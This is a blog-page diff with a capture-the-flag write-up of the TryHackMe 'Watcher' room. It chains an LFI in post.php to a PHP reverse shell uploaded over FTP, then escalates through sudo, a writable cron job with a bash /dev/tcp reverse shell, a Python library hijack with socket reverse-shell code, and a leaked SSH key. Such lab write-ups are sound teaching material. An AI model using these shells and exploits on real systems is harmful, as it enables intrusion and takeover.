@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      Watcher &middot; Low Priv Notes
+    
+  </title>
+
+  
+  <link rel="canonical" href="http://localhost:4000/ctf/2026/07/08/watcher/">
+  
+
+  <link rel="stylesheet" href="http://localhost:4000/public/css/poole.css">
+  <link rel="stylesheet" href="http://localhost:4000/public/css/syntax.css">
+  <link rel="stylesheet" href="http://localhost:4000/public/css/lanyon.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Serif:400,400italic,700%7CPT+Sans:400">
+
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/public/apple-touch-icon-precomposed.png">
+  <link rel="shortcut icon" href="http://localhost:4000/public/favicon.ico">
+
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="http://localhost:4000/atom.xml">
+
+  
+</head>
+
+
+  <body>
+
+    <input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox">
+
+<div class="sidebar" id="sidebar">
+  <div class="sidebar-item">
+    <p>Notes, CTF writeups and security research. Focusing on alternative privilege escalation vectors.</p>
+  </div>
+
+  <nav class="sidebar-nav">
+    <a class="sidebar-nav-item" href="http://localhost:4000/">Home</a>
+    <a class="sidebar-nav-item" href="http://localhost:4000/about">About</a>
+  </nav>
+
+  <div class="sidebar-item">
+    <p>
+      &copy; 2026. All rights reserved.
+    </p>
+  </div>
+</div>
+
+
+    <!-- Wrap is the content to shift when toggling the sidebar. We wrap the
+         content to avoid any CSS collisions with our real content. -->
+    <div class="wrap">
+      <div class="masthead">
+        <div class="container">
+          <h3 class="masthead-title">
+            <a href="/" title="Home">Low Priv Notes</a>
+<br>            
+<small>Exploring alternative exploitation paths</small>
+          </h3>
+        </div>
+      </div>
+
+      <div class="container content">
+        <div class="post">
+  <h1 class="post-title">Watcher</h1>
+  <span class="post-date">08 Jul 2026</span>
+  <h2 id="overview">Overview</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Platform</strong></td>
+      <td>TryHackMe</td>
+    </tr>
+    <tr>
+      <td><strong>Difficulty</strong></td>
+      <td>Medium</td>
+    </tr>
+    <tr>
+      <td><strong>URL</strong></td>
+      <td><a href="https://tryhackme.com/room/watcher" target="_blank">https://tryhackme.com/room/watcher</a></td>
+    </tr>
+    <tr>
+      <td><strong>Focus</strong></td>
+      <td>A single LFI bug gets you in, and then every privilege jump after that is a completely different technique</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Watcher packs an unusual amount into one box. Getting a foothold is the easy part — a single LFI does all the work. What makes this one interesting is that root is four separate privilege escalations away, and every single one of them is a different trick. Nothing here needed to be clever twice.</p>
+
+<hr />
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-O</span> <span class="nt">-p</span> 21,22,80 &lt;TARGET_IP&gt;
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</code></pre></div></div>
+
+<p>FTP, SSH, and a web server. Adding it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> before poking at the site:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"&lt;TARGET_IP&gt; watcher.thm"</span> <span class="o">&gt;&gt;</span> /etc/hosts
+</code></pre></div></div>
+
+<h2 id="getting-in-lfi-to-rce">Getting In: LFI to RCE</h2>
+
+<p>A quick directory scan turns up <code class="language-plaintext highlighter-rouge">post.php</code>, <code class="language-plaintext highlighter-rouge">robots.txt</code>, and a couple of oddly-named files:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://&lt;TARGET_IP&gt; <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-b</span> 400,404
+feroxbuster <span class="nt">-u</span> http://&lt;TARGET_IP&gt;/ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> xml,html,php,txt,jpg,png,js,json <span class="nt">--extract-links</span> <span class="nt">--scan-limit</span> 2 <span class="nt">--filter-status</span> 401,403,404,405,500
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">robots.txt</code> all but confirms one of them is worth reading:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> http://&lt;TARGET_IP&gt;/robots.txt
+
+User-agent: <span class="k">*</span>
+Allow: /flag_1.txt
+Allow: /secret_file_do_not_read.txt
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">post.php</code> takes a <code class="language-plaintext highlighter-rouge">post</code> parameter, and running it through PHP’s filter wrapper dumps its own source instead of executing it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="s2">"http://&lt;TARGET_IP&gt;/post.php?post=php://filter/convert.base64-encode/resource=post.php"</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">grep </span>php
+
+&lt;?php include <span class="nv">$_GET</span><span class="o">[</span><span class="s2">"post"</span><span class="o">]</span><span class="p">;</span> ?&gt;
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">include</code> is a completely normal PHP statement — it pulls in and runs another file’s code inline, usually for templating or splitting an app into modules. The problem is entirely in <em>where</em> the filename comes from here: straight from user input, no validation, no restriction to a directory. Whatever <code class="language-plaintext highlighter-rouge">post.php</code> can read, I can read.</p>
+
+<p>Including that file <code class="language-plaintext highlighter-rouge">robots.txt</code> said not to read:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="s2">"http://&lt;TARGET_IP&gt;/post.php?post=secret_file_do_not_read.txt"</span>
+
+Hi Mat,
+
+The credentials <span class="k">for </span>the FTP server are below. I<span class="s1">'ve set the files to be saved to /home/ftpuser/ftp/files.
+
+Will
+----------
+ftpuser:givemefiles777
+</span></code></pre></div></div>
+
+<p>And a quick read of <code class="language-plaintext highlighter-rouge">/etc/passwd</code> to see who’s on the box:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="s2">"http://&lt;TARGET_IP&gt;/post.php?post=/etc/passwd"</span> | <span class="nb">grep </span>bash | <span class="nb">cut</span> <span class="nt">-d</span>: <span class="nt">-f1</span>
+
+root
+will
+mat
+toby
+ubuntu
+</code></pre></div></div>
+
+<p>Logging into FTP with the leaked credentials lands in the same <code class="language-plaintext highlighter-rouge">files</code> directory the note mentioned — which is also served over HTTP. That’s upload plus LFI in one place, which is really just RCE waiting to happen: drop a PHP reverse shell over FTP, then request it through the LFI.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /usr/share/webshells/php/php-reverse-shell.php php-reverse-shell.php
+<span class="c"># edited $ip / $port to &lt;ATTACKER_IP&gt; / &lt;ATTACKER_PORT&gt;</span>
+
+ftp &lt;TARGET_IP&gt;
+ftp&gt; <span class="nb">cd </span>files
+ftp&gt; put php-reverse-shell.php
+ftp&gt; quit
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> &lt;ATTACKER_PORT&gt;
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="s2">"http://&lt;TARGET_IP&gt;/post.php?post=/home/ftpuser/ftp/files/php-reverse-shell.php"</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>connect to <span class="o">[</span>&lt;ATTACKER_IP&gt;] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>&lt;TARGET_IP&gt;] 38158
+<span class="nb">id
+
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Shell as <code class="language-plaintext highlighter-rouge">www-data</code>.</p>
+
+<h2 id="four-ways-up">Four Ways Up</h2>
+
+<h3 id="sudo-nopasswd">sudo NOPASSWD</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
+
+User www-data may run the following commands on &lt;TARGET_IP&gt;:
+    <span class="o">(</span>toby<span class="o">)</span> NOPASSWD: ALL
+</code></pre></div></div>
+
+<p>That’s about as direct as escalation gets:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> toby /bin/bash
+<span class="nb">id
+
+</span><span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>toby<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>toby<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1003<span class="o">(</span>toby<span class="o">)</span>
+</code></pre></div></div>
+
+<h3 id="an-editable-cron-job">An Editable Cron Job</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/crontab
+
+<span class="k">*</span>/1 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> mat /home/toby/jobs/cow.sh
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">mat</code> runs that script every minute, and <code class="language-plaintext highlighter-rouge">toby</code> can write to it. Swap the contents for a reverse shell, wait for the timer:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> <span class="o">&gt;</span> /home/toby/jobs/cow.sh <span class="o">&lt;&lt;</span> <span class="sh">'</span><span class="no">EOF</span><span class="sh">'
+#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER_IP&gt;/&lt;ATTACKER_PORT&gt; 0&gt;&amp;1
+</span><span class="no">EOF
+</span><span class="nb">chmod</span> +x /home/toby/jobs/cow.sh
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>connect to <span class="o">[</span>&lt;ATTACKER_IP&gt;] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>&lt;TARGET_IP&gt;] 46206
+<span class="nb">id
+
+</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>mat<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>mat<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>mat<span class="o">)</span>
+</code></pre></div></div>
+
+<h3 id="python-library-hijacking">Python Library Hijacking</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
+
+User mat may run the following commands on &lt;TARGET_IP&gt;:
+    <span class="o">(</span>will<span class="o">)</span> NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py <span class="k">*</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">will_script.py</code> checks a command against a whitelist before running it — reasonable enough, except it imports its whitelist-checking function like this:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">cmd</span> <span class="kn">import</span> <span class="n">get_command</span>
+</code></pre></div></div>
+
+<p>No path, just a module name. Python looks in the current directory before it looks anywhere else, and the script runs from <code class="language-plaintext highlighter-rouge">/home/mat/scripts/</code>. Whatever <code class="language-plaintext highlighter-rouge">cmd.py</code> sits there wins over the real standard library module.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># cmd.py
+</span><span class="kn">import</span> <span class="n">socket</span><span class="p">,</span><span class="n">subprocess</span><span class="p">,</span><span class="n">os</span>
+<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">&lt;ATTACKER_IP&gt;</span><span class="sh">"</span><span class="p">,</span><span class="o">&lt;</span><span class="n">ATTACKER_PORT</span><span class="o">&gt;</span><span class="p">))</span>
+<span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="nf">call</span><span class="p">([</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">-i</span><span class="sh">"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">get_command</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
+    <span class="k">return</span> <span class="sh">""</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">get_command</code> stub at the end matters more than it looks — <code class="language-plaintext highlighter-rouge">will_script.py</code> calls it right after the import, and without a matching function it would crash before the shell ever got a chance to connect.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> will /usr/bin/python3 /home/mat/scripts/will_script.py 1
+<span class="nb">id
+
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>will<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>will<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>will<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>
+</code></pre></div></div>
+
+<h3 id="a-leftover-ssh-key">A Leftover SSH Key</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./linpeas.sh 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s2">"key</span><span class="se">\|</span><span class="s2">ssh</span><span class="se">\|</span><span class="s2">private"</span>
+</code></pre></div></div>
+
+<p>Turns up a base64-encoded key, readable thanks to the <code class="language-plaintext highlighter-rouge">adm</code> group membership from the last step:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-l</span> /opt/backups/key.b64
+
+<span class="nt">-rw-rw----</span> 1 root adm 2270 Dec  3  2020 key.b64
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /opt/backups/key.b64 | <span class="nb">base64</span> <span class="nt">-d</span>
+
+<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAzPaQFolQq8cHom9mssyPZ53aLzBcRyBw+rysJ3h0JCxnV+aG
+<span class="o">[</span>...]
+<span class="nt">-----END</span> RSA PRIVATE KEY-----
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod </span>600 root_key.pem
+ssh <span class="nt">-i</span> root_key.pem root@&lt;TARGET_IP&gt;
+<span class="nb">whoami
+
+</span>root
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="attack-flow">Attack Flow</h2>
+
+<div class="mermaid">
+graph TD
+    A["Nmap<br />FTP, SSH, HTTP"] --&gt; B["robots.txt<br />hints at hidden files"]
+    B --&gt; C["LFI in post.php<br />source disclosure"]
+    C --&gt; D["LFI<br />leaked FTP credentials"]
+    D --&gt; E["FTP access"]
+    E --&gt; F["Upload PHP reverse shell<br />via FTP"]
+    F --&gt; G["Trigger via LFI<br />RCE as www-data"]
+    G --&gt; H["sudo NOPASSWD<br />escalate to toby"]
+    H --&gt; I["Editable cron job<br />escalate to mat"]
+    I --&gt; J["Python Library Hijacking<br />escalate to will"]
+    J --&gt; K["linpeas finds<br />base64 SSH key"]
+    K --&gt; L["Decode and SSH<br />as root"]
+</div>
+
+<hr />
+
+<h2 id="key-takeaways">Key Takeaways</h2>
+
+<p><strong>A file with a scary name isn’t a security control.</strong> <code class="language-plaintext highlighter-rouge">secret_file_do_not_read.txt</code> and a <code class="language-plaintext highlighter-rouge">robots.txt</code> entry aren’t obstacles — they’re just names. Read them.</p>
+
+<p><strong>Escalation chains reward finishing the enumeration, not just the exploit.</strong> Every single hop here — sudo, cron, Python imports, file permissions — was a fresh, independent check. Stopping after the first successful trick would have ended things at <code class="language-plaintext highlighter-rouge">toby</code>.</p>
+
+<p><strong>An import without a path is a location, not just a name.</strong> <code class="language-plaintext highlighter-rouge">from cmd import get_command</code> trusts wherever Python happens to look first, and the current working directory comes before the standard library.</p>
+
+</div>
+
+
+<div class="related">
+  <h2>Related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/ctf/web/2026/07/10/blog/">
+            Blog
+            <small>10 Jul 2026</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/websec/2026/07/07/username-enumeration-timing/">
+            Username Enumeration via Response Timing
+            <small>07 Jul 2026</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/ctf/2026/07/06/stuxctf/">
+            StuxCTF
+            <small>06 Jul 2026</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+      </div>
+    </div>
+
+    <label for="sidebar-checkbox" class="sidebar-toggle"></label>
+
+    <script src='/public/js/script.js'></script>
+  </body>
+</html>
